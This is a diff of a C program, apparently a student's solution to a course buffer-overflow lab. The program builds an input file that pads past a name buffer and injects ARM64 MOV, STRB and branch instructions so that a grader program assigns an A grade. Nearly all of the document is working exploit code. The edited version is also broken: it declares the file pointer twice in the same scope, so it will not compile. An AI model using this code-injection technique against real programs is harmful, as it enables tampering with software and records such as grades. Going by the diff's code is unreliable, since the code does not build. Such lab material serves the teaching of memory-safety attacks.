@@ -13,42 +13,41 @@
  * causing the grader program to assign the A grade. 
  */
 int main() {
-    FILE *file; 
+    FILE *psFile; 
     unsigned int MOV, STRB, B; 
-
-    file = fopen("dataA", "wb");
-    if (!file) {
-        perror("Unable to open file");
-        return 1;
-    }
 
     /* write name and null terminator to file. 
     grader program will ... */ 
-    fwrite("Claire Shin", 1, 12, file);
-    // fputc('\0', file);
+    char name[] = "Claire Shin";
+    FILE *psFile = fopen("dataB", "wb");
+    if (psFile == NULL) {
+        perror("Error opening file"); 
+        return 1;  /* Return error code if file opening fails */
+    }
+    fwrite(name, sizeof(char), sizeof(name) - 1, psFile);
 
     /* add padding so that buffer overflow can be performed 
     48 - 11 (length of name)= 37. */ 
-    for (int i = 0; i < 36; i++) {
-        fputc('A', file);
+    for (int i = 0; i < 37; i++) {
+        fputc(0x00, psFile);
     }
 
     /* MOV grade A to register W0 using MiniAssembler */
     MOV = MiniAssembler_mov(0, 'A');
-    fwrite(&MOV, sizeof(unsigned int), 1, file);
+    fwrite(&MOV, sizeof(unsigned int), 1, psFile);
 
     /* STR A in register W0 into the address pointed by X1
     branch back to normal program flow after setting grade to A */
     STRB = MiniAssembler_strb(0, 1);
-    fwrite(&STRB, sizeof(unsigned int), 1, file);
+    fwrite(&STRB, sizeof(unsigned int), 1, psFile);
 
     /* B back to return address */ 
     /* 0x40087c is instruction address after getName returns
     0xffffffffea48 is the injected instruction address based on gdb */
-    B = MiniAssembler_b(0x40087c, 0xffffffffea48);
-    fwrite(&B, sizeof(unsigned int), 1, file);
+    B = MiniAssembler_b(0xffffffffea48, 0x40087c);
+    fwrite(&B, sizeof(unsigned int), 1, psFile);
 
-    fclose(file);
+    fclose(psFile);
     return 0;
 
 }
